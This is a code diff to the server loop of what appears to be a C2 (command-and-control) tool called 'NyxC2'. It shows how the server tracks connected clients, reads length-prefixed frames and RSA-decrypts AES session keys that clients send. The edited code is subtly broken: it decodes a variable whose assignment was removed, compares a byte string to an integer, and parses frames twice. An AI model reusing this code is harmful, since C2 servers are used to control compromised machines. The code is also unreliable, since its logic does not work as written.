@@ -122,21 +122,23 @@ def server():
                 # current display name so received output can be identified.
                 nom_cible = "Inconnu"
                 for name, sock in dict_ip.items():
-                    if sock == elem:
+                    if sock[0] == elem:
                         nom_cible = name
                         break
                 try:
-                    # Read up to 4096 bytes from the client. An empty byte
-                    # string means that the peer closed the connection cleanly.
-                    new_data = elem.recv(4096)
                     
                     length_bytes = elem.recv(4)
-                    if len(length_bytes) != 4:
-                        length = struct.unpack("<I", length_bytes)[0]
-                        frame = elem.recv(length)
+                    length = struct.unpack("<I", length_bytes)[0]
+                    frame = elem.recv(length)
                     
+                    type_byte = frame[0]
+                    ciphertext = frame[1:]
                     
-                    if not new_data:
+                    if type_byte == 0x01:
+                        aes_key = rsa_decryption(private_key, ciphertext)
+                        dict_ip[nom_cible] = (elem, True, aes_key)
+                    
+                    if length_bytes == 0:
                         print(f"connection lost with {nom_cible}")
                         print("\nNyxC2 > ", end="", flush=True)
                         server_list.remove(elem)
@@ -149,7 +151,7 @@ def server():
                         # are replaced so decoding cannot stop the event loop.
                         new_data = new_data.decode('cp850', errors='replace').strip()
                             
-                        if new_data:
+                        if length_bytes != 4:
                             type_byte = frame[0]
                             ciphertext = frame[1:]
                             if type_byte == 0x01:
